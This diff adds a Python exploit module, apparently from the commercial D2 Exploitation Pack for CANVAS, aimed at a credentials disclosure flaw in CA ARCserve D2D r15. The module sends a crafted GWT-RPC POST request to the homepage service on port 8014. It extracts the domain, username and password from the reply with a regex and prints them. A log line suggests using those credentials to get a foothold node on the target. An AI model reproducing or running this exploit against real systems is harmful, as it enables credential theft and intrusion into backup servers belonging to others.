@@ -1,0 +1,130 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys
+import re
+import random
+import time
+import thread
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import libs.spkproxy as spkproxy
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "CA ARCserve D2D Credentials Disclosure Vulnerability"
+DESCRIPTION = "Credentials disclosure vulnerability in CA ARCserve D2D"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "CA"
+DOCUMENTATION["Date public"] = "2011.07.25"
+DOCUMENTATION["VersionsAffected"] = "CA ARCserve D2D r15"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://retrogod.altervista.org/9sg_ca_d2dii.html"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+	
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME       
+		self.port = 8014
+		self.version = 0
+		self.ssl = 0
+		return
+
+
+	def neededListenerTypes(self):
+		from canvasengine import WIN32MOSDEF
+		return [WIN32MOSDEF]
+
+    	        
+	def run(self):
+		# Init	   
+		domain = ""
+		user = ""
+		password = ""
+		data = ""
+		
+		# Check arguments
+		self.host = self.target.interface
+		self.port = self.argsDict.get("port", self.port)
+		self.ssl = int(self.argsDict.get("ssl", self.ssl))
+					               
+		self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+		self.log("Attacking %s:%d"%(self.host, self.port))                	
+
+		buff = "5|0|4|http://%s:%d/contents/|2C6B33BED38F825C48AE73C093241510|com.ca.arcflash.ui.client.homepage.HomepageService|getLocalHost|1|2|3|4|0|" % (self.host, self.port)
+             
+		sploitstring = "POST /contents/service/homepage HTTP/1.1\r\n"
+		sploitstring += "Host: %s:%d\r\n" % (self.host, self.port)
+		sploitstring += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n"		
+		sploitstring += "Content-Type: text/x-gwt-rpc; charset=utf-8\r\n"
+		sploitstring += "Content-Length: %d\r\n" % len(buff)
+		sploitstring += "\r\n"
+		sploitstring += buff
+		
+		try:
+		  s = self.gettcpsock()
+		  s.connect((self.host, self.port))
+		  self.websend(s, sploitstring)
+		  data = self.webrecv(s)
+		except:
+		  self.log("[D2] connection error (host:%s port:%d ssl:%d" % (self.host,self.port,self.ssl))        		  
+		
+		m = re.search(".*\"([^\"]+)\",\"uuid\",\"[^\"]+\",\"type\",\"user\",\"([^\"]+)\",\"password\",\"([^\"]+)\",.*", data)
+
+		if m is not None:
+			domain = m.group(1)
+			user = m.group(2)
+			password = m.group(3)
+
+		self.log("[D2] DOMAIN: %s" % domain)
+		self.log("[D2] USER: %s" % user)
+		self.log("[D2] PASSWORD: %s" % password)
+		self.log("[D2] You can use the credentials to log in the CA D2D web interface or you can use it with d2sec_smbmosdef to get a MOSDEF node on the target host.")
+                		          
+		self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+						            
+		return 1            
+       
+			  		
+	def usage(self):        
+		print "Usage: %s -v version -t targethost -l localip -d localport [-O ssl:0|1]\n" % sys.argv[0]					
+		sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
